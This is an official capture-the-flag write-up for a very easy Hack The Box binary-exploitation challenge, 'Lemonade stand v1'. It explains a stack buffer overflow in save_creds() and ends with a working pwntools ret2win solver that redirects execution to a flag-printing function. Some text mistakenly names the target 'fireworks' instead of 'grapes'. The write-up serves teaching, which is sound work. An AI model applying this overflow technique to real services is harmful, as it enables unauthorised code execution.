![](assets/banner.png)



<img src="assets/htb.png" style="margin-left: 20px; zoom: 80%;" align=left />    	<font size="10">Lemonade stand v1 </font>

​		28<sup>th</sup> August 2023 / Document No. DYY.102.XX

​		Prepared By: w3th4nds

​		Challenge Author(s): w3th4nds

​		Difficulty: <font color=green>Very Easy</font>

​		Classification: Official

 



# Synopsis

Lemonade stand v1 is a very easy difficulty challenge that features exploiting a buffer overflow vulnerability and call a function that is never called (`ret2win`).

## Skills Required

- Basic C

## Skills Learned

- ret2win, redirect the flow of the program to call a function never called.

# Enumeration

First of all, we start with a `checksec`:  

```console
pwndbg> checksec
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
    RUNPATH:  b'./glibc/'
```

### Protections 🛡️

As we can see:

| Protection | Enabled  | Usage   | 
| :---:      | :---:    | :---:   |
| **Canary** | ❌       | Prevents **Buffer Overflows**  |
| **NX**     | ✅       | Disables **code execution** on stack |
| **PIE**    | ❌       | Randomizes the **base address** of the binary | 
| **RelRO**  | **Full** | Makes some binary sections **read-only** |

The interface of the program looks like this:

```console
	△ △ △ △ △ △ △ △
	░░░░░░░░░░░░░░░
	░             ░
	░ ٨ э ɱ Ӧ Ӣ ∑ ░
	░             ░
	░░░░░░░░░░░░░░░
	░             ░
	░    _/       ░
	░   | |  _/   ░
	░   | | | |   ░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░


Current coins: [12]

Would you like to buy a lemonade?

1. Normal (3$)
2. Large  (5$)

>> 2

[+] Enjoy your large lemonade!


	△ △ △ △ △ △ △ △
	░░░░░░░░░░░░░░░
	░             ░
	░ ٨ э ɱ Ӧ Ӣ ∑ ░
	░             ░
	░░░░░░░░░░░░░░░
	░             ░
	░    _/       ░
	░   | |  _/   ░
	░   | | | |   ░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░
	░░░░░░░░░░░░░░░


Current coins: [7]

Would you like to buy a lemonade?

1. Normal (3$)
2. Large  (5$)
```

We cannot understand much from the program interface, so we will dig deeper to the disassembler.

### Disassembly ⛏️

Starting with `main()`:

```c
void main(void)

{
  long lVar1;
  
  setup();
  puts("\x1b[1;33m");
  cls();
  do {
    while( true ) {
      while (lVar1 = menu(), lVar1 == 1) {
        buy_normal();
      }
      if (lVar1 == 2) break;
      error("We don\'t sell grapes!");
    }
    buy_large();
  } while( true );
}
```

There are some function calls but we will focus only on the important ones.

We continue with one of the `buy_large()` or `buy_normal()`. 

```c
void buy_normal(void)

{
  if (COINS < 4) {
    error("You don\'t have enough coins!");
    save_creds();
  }
  else {
    printf("\n%s[+] Enjoy your lemonade!\n%s",&DAT_0040101e,&DAT_00400c88);
    COINS = COINS - 3;
  }
  return;
}
```

We see that when we reduce the coins enough, it calls the `save_creds()` function.

```c
void save_creds(void)

{
  long lVar1;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  undefined8 local_18;
  undefined8 local_10;
  
  local_28 = 0;
  local_20 = 0;
  local_18 = 0;
  local_10 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  puts(
      "\n\nI can give you a free lemonade but I need your information for next time so you can payme back!\n"
      );
  printf("1. Yes\n2. No thanks\n\n>> ");
  lVar1 = read_num();
  if (lVar1 == 1) {
    printf("\nPlease tell me your name: ");
    read(0,&local_28,0x1e);
    printf("\nPlease tell me your surname: ");
    read(0,&local_48,0x4a);
    puts("Thanks a lot! Here is your lemonade!\n");
  }
  return;
}
```

The bug occurs here. 

We have a `read(0,&local_48,0x4a);` and the `local_48` buffer is `64` bytes while `read` reads up to `0x4a` (74 in decimal). So we have approximately 10 bytes overflow which is more than enough to proceed.

If we take a better look at the functions, we see this:

```c
void grapes(void)

{
  ssize_t sVar1;
  char local_d;
  int local_c;
  
  local_c = open("./flag.txt",0);
  if (local_c < 0) {
    perror("\nError opening flag.txt, please contact an Administrator.\n");
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  while( true ) {
    sVar1 = read(local_c,&local_d,1);
    if (sVar1 < 1) break;
    fputc((int)local_d,stdout);
  }
  close(local_c);
  return;
}
```

The `grapes` functions reads and prints the flag. So, this is our goal.

### Exploitation path

So far, we know that the binary has:

* No `PIE`: we know the base address of the binary and also the address of all the functions of the program, like `fireworks`.
* No `Canary`: there is nothing to halt / terminate the binary after we trigger a `buffer overflow` / overwrite the `return address` of the program.
* A function whose address is known (`PIE` is disabled) and it prints the `flag.txt`.

There is 1 thing left:

* Find the known address of `grapes`.

### Debugging 

To find the overflow offset, we open the binary inside the debugger. I prefer the [pwndbg](https://github.com/pwndbg/pwndbg) extension on `gdb` to work with.

```gdb
➜  challenge gdb ./lemonade_stand_v1 
GNU gdb (Ubuntu 8.1.1-0ubuntu1) 8.1.1
Copyright (C) 2018 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
pwndbg: loaded 141 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from ./lemonade_stand_v1...(no debugging symbols found)...done.
------- tip of the day (disable with set show-tips off) -------
Pwndbg sets the SIGLARM, SIGBUS, SIGPIPE and SIGSEGV signals so they are not passed to the app; see info signals for full GDB signals configuration
pwndbg> print grapes
$1 = {<text variable, no debug info>} 0x4008cf <grapes>
pwndbg> p grapes
$2 = {<text variable, no debug info>} 0x4008cf <grapes>
```

We see that the address of `grapes` is `0x4008cf`.

Before that, we will learn a better way to connect with the remote instance and craft the payload easier and cleaner.

### Pwntools 🛠️

First of all, we need to install [pwntools](https://docs.pwntools.com/en/stable/install.html) We are going to use the [`ELF`](https://docs.pwntools.com/en/stable/elf/elf.html) module to get the address of `fireworks`. For packing, `pwntools` have a built-in function, [`p64()`](https://docs.pwntools.com/en/stable/util/packing.html). It is mainly used for packing integers. From the official page of pwntools:

> Module for packing and unpacking integers.
>
> Simplifies access to the standard struct.pack and struct.unpack functions, and also adds support for packing/unpacking arbitrary-width integers.
>
> The packers are all context-aware for endian and signed arguments, though they can be overridden in the parameters.

We know the overflow offset, there is no `PIE` or `Canary` and the address of `grapes` is known. The payload should look like this.

# Solution

```python
#!/usr/bin/python3.8
from pwn import *
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './lemonade_stand_v1' 

LOCAL = False

os.system('clear')

sla = lambda x,y : r.sendlineafter(x,y)

# Open local process or remote connection
if LOCAL:
  print('Running solver locally..\n')
  r    = process(fname)
else:
  IP   = str(sys.argv[1]) if len(sys.argv) >= 2 else '0.0.0.0'
  PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 1337
  r    = remote(IP, PORT)
  print(f'Running solver remotely at {IP}:{PORT}\n')

e = ELF(fname)

# Reduce coinds to call save_creds
[sla('>> ', '2') for i in range(3)]

# Yes
sla('>>', '1')

# Fill name
sla('name: ', 'htb')

# Overflow the buffer
sla('surname: ', b'A'*72 + p64(e.sym.grapes))

# Read flag
print(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}\n')
```

```console
Running solver remotely at 0.0.0.0:1337

Flag --> HTB{f4k3_fl4g_f0r_writ3up}
```
